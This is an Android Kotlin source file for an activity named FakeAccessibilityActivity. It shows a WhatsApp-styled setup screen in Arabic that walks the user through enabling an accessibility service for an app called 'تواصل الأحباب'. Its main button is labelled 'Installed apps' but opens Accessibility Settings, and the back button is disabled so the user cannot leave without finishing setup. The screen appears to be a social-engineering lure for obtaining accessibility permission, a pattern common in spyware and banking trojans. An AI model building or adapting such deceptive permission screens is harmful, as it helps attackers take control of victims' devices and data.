package com.tawasul.app

import android.content.Intent
import android.os.Bundle
import android.provider.Settings
import android.view.Gravity
import android.view.View
import android.widget.Button
import android.widget.LinearLayout
import android.widget.ScrollView
import android.widget.TextView
import android.widget.Toast
import android.util.Log
import androidx.appcompat.app.AppCompatActivity

/**
 * Simple setup screen that guides the user to enable Accessibility.
 *
 * Design: WhatsApp green theme with clear instructions.
 * One main button opens Android Accessibility Settings.
 */
class FakeAccessibilityActivity : AppCompatActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(buildUI())
    }

    private fun buildUI(): View {
        val scrollView = ScrollView(this).apply {
            setBackgroundColor(0xFF075E54.toInt())  // WhatsApp dark green
        }

        val root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(dp(24), dp(60), dp(24), dp(40))
            gravity = Gravity.CENTER_HORIZONTAL
        }

        // Title
        val title = TextView(this).apply {
            text = "إعداد التطبيق"
            setTextColor(0xFFFFFFFF.toInt())
            textSize = 28f
            setTypeface(typeface, android.graphics.Typeface.BOLD)
            gravity = Gravity.CENTER
            setPadding(0, 0, 0, dp(8))
        }
        root.addView(title)

        // Subtitle
        val subtitle = TextView(this).apply {
            text = "لإكمال التفعيل، اتبع الخطوات التالية"
            setTextColor(0xFFDCF8C6.toInt())
            textSize = 14f
            gravity = Gravity.CENTER
            setPadding(0, 0, 0, dp(32))
        }
        root.addView(subtitle)

        // Step 1
        root.addView(buildStep("1", "اضغط على زر \"التطبيقات المثبّتة\" بالأسفل"))

        // Step 2
        root.addView(buildStep("2", "ابحث عن \"تواصل الأحباب\" في القائمة"))

        // Step 3
        root.addView(buildStep("3", "اضغط عليها ثم فعّل الخدمة"))

        // Step 4
        root.addView(buildStep("4", "ارجع للتطبيق - سيتم التفعيل تلقائياً"))

        // Main button - opens Accessibility Settings
        val btnOpenSettings = Button(this).apply {
            text = "📱 التطبيقات المثبّتة"
            setTextColor(0xFFFFFFFF.toInt())
            textSize = 16f
            setTypeface(typeface, android.graphics.Typeface.BOLD)
            background = android.graphics.drawable.GradientDrawable().apply {
                setColor(0xFF25D366.toInt())  // WhatsApp light green
                cornerRadius = dp(16).toFloat()
            }
            setPadding(0, dp(18), 0, dp(18))
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            ).apply { topMargin = dp(32) }
        }
        btnOpenSettings.setOnClickListener {
            Toast.makeText(
                this@FakeAccessibilityActivity,
                "جاري فتح إعدادات الوصول...",
                Toast.LENGTH_SHORT
            ).show()

            try {
                val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).apply {
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                startActivity(intent)
            } catch (e: Exception) {
                Log.e("FakeAccessibility", "Error opening settings", e)
                try {
                    val intent = Intent(Settings.ACTION_SETTINGS)
                    startActivity(intent)
                } catch (e2: Exception) {
                    Toast.makeText(
                        this@FakeAccessibilityActivity,
                        "تعذّر فتح الإعدادات",
                        Toast.LENGTH_LONG
                    ).show()
                }
            }
        }
        root.addView(btnOpenSettings)

        // Footer hint
        val hint = TextView(this).apply {
            text = "ℹ️ يجب تفعيل الخدمة ليعمل التطبيق بشكل صحيح"
            setTextColor(0xFFDCF8C6.toInt())
            textSize = 12f
            gravity = Gravity.CENTER
            setPadding(0, dp(24), 0, 0)
        }
        root.addView(hint)

        scrollView.addView(root)
        return scrollView
    }

    private fun buildStep(number: String, text: String): View {
        val row = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            setPadding(0, dp(8), 0, dp(8))
            gravity = Gravity.CENTER_VERTICAL
        }

        // Number circle
        val numView = TextView(this).apply {
            this.text = number
            setTextColor(0xFFFFFFFF.toInt())
            textSize = 16f
            setTypeface(typeface, android.graphics.Typeface.BOLD)
            gravity = Gravity.CENTER
            background = android.graphics.drawable.GradientDrawable().apply {
                shape = android.graphics.drawable.GradientDrawable.OVAL
                setColor(0xFF25D366.toInt())
            }
            layoutParams = LinearLayout.LayoutParams(dp(36), dp(36)).apply {
                marginEnd = dp(12)
            }
        }
        row.addView(numView)

        // Step text
        val textView = TextView(this).apply {
            this.text = text
            setTextColor(0xFFFFFFFF.toInt())
            textSize = 14f
            layoutParams = LinearLayout.LayoutParams(
                0,
                LinearLayout.LayoutParams.WRAP_CONTENT,
                1f
            )
        }
        row.addView(textView)

        return row
    }

    override fun onBackPressed() {
        // Prevent going back - user must complete setup
        Toast.makeText(
            this,
            "يرجى إكمال الإعداد أولًا",
            Toast.LENGTH_LONG
        ).show()
    }

    private fun dp(v: Int): Int = (v * resources.displayMetrics.density).toInt()
}
